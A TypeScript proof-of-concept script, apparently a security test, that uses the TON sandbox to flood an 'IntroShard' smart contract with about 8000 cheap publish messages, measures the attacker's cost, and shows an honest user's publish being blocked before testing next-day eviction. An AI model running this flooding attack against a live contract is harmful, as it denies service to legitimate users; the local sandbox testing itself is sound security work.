import { beginCell, contractAddress, toNano, Cell } from '@ton/core';
import { Blockchain } from '@ton/sandbox';
import { IntroShard, storeIntroPublish } from './build/IntroShard/IntroShard_IntroShard';

const introBody = (r: bigint, vt: bigint, h0: Cell, b: Cell) =>
  beginCell().store(storeIntroPublish({ $$type: 'IntroPublish', r, view_tag: vt, header_0: h0, body: b })).endCell();

function countCells(root: Cell) {
  const seen = new Set<string>();
  const stack = [root];
  let bits = 0;
  while (stack.length) {
    const c = stack.pop()!;
    const k = c.hash().toString('hex');
    if (seen.has(k)) continue;
    seen.add(k);
    bits += c.bits.length;
    for (const r of c.refs) stack.push(r);
  }
  return { cells: seen.size, bits };
}

async function main() {
  const bc = await Blockchain.create();
  bc.now = 1_800_000_000;
  const epoch = Math.floor(bc.now / 86400);
  const attacker = await bc.treasury('attacker', { balance: toNano('100000') });
  const honest = await bc.treasury('honest');

  const init = await IntroShard.init(BigInt(epoch), 0n);
  const addr = contractAddress(0, init);
  const shard = bc.openContract(new IntroShard(addr, init));
  const empty = beginCell().endCell();

  await attacker.send({ to: addr, value: toNano('0.01'), init, bounce: true, body: introBody(1n, 1n, empty, empty) } as any);

  const start = (await bc.getContract(attacker.address)).balance;
  const t0 = Date.now();
  const marks: number[] = [];
  let prev = start;
  let maxGasUsed = 0n;
  let anyNonZeroExit = false;

  for (let i = 2; i <= 8000; i++) {
    const res = await attacker.send({
      to: addr, value: 2508000n, bounce: true, body: introBody(BigInt(i), 7n, empty, empty),
    } as any);
    const tx: any = res.transactions.find((t: any) => t.inMessage?.info?.dest?.equals?.(addr));
    if (tx) {
      const cp = tx.description?.computePhase;
      if (cp?.exitCode !== 0) anyNonZeroExit = true;
      if (cp?.gasUsed && cp.gasUsed > maxGasUsed) maxGasUsed = cp.gasUsed;
    }
    if (i % 1000 === 0) {
      const now = (await bc.getContract(attacker.address)).balance;
      const per = Number(prev - now) / 1000 / 1e9;
      marks.push(per);
      console.log(`live~${i}  per-publish over last 1000: ${per.toFixed(9)} TON   maxGas so far ${maxGasUsed}`);
      prev = now;
    }
  }
  const end = (await bc.getContract(attacker.address)).balance;
  const v = await shard.getGetView();
  const acct: any = await bc.getContract(addr);
  console.log('--------------------------------------------------------');
  console.log('elapsed s:', ((Date.now() - t0) / 1000).toFixed(1));
  console.log('live_count:', v.live_count, ' next_id:', v.next_id, ' safe_cap:', v.safe_cap);
  console.log('any non-zero exit during fill:', anyNonZeroExit, ' max gasUsed:', maxGasUsed);
  console.log('TOTAL attacker cost to fill one bucket:', Number(start - end) / 1e9, 'TON');
  console.log('shard balance:', Number(acct.balance) / 1e9, 'TON');

  const data: Cell | undefined = acct.account?.account?.storage?.state?.state?.data;
  if (data) {
    const s = countCells(data);
    console.log('shard DATA cells:', s.cells, ' bits:', s.bits, ' (account cell ceiling ~65536)');
  }

  // ---- THE BLACKOUT: an honest first contact now ----
  const blocked = await honest.send({
    to: addr, value: toNano('0.05'), bounce: true, body: introBody(0xDEADn, 0x99n, empty, empty),
  } as any);
  const codes = blocked.transactions.map((t: any) => ({
    exit: t.description?.computePhase?.exitCode,
    bounced: t.inMessage?.info?.bounced,
  }));
  console.log('HONEST publish after fill:', JSON.stringify(codes));
  const v2 = await shard.getGetView();
  console.log('live_count after honest attempt:', v2.live_count);

  // ---- can eviction rescue the same day? ----
  bc.now = 1_800_000_000 + 86400;      // next day, still inside the 1-week retention
  const ev = await honest.send({
    to: addr, value: toNano('0.5'), bounce: true,
    body: beginCell().storeUint(0x49535032, 32).storeUint(64, 16).endCell(),
  } as any);
  const v3 = await shard.getGetView();
  console.log('after EvictIntros at +1 day: live_count =', v3.live_count,
    ' exits=', JSON.stringify(ev.transactions.map((t: any) => t.description?.computePhase?.exitCode)));
}

main();
